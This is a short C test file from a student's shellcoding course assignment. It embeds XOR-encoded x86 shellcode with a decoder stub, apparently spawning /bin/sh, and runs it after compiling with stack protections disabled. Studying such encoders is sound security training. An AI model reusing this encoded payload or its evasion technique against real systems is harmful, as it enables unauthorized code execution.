// Student ID   : SLAE-1250
// Student Name : Jonathan "Chops" Crosby
// Assignment 4 : Shell Code Test File
// File Name    : shellcode.c

#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack

unsigned char code[] = \
"\xeb\x0d\x5e\x8a\x1e\x80\xf3\xff\x74\x0a\x88\x1e\x46\xeb\xf4\xe8\xee\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f\xff";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
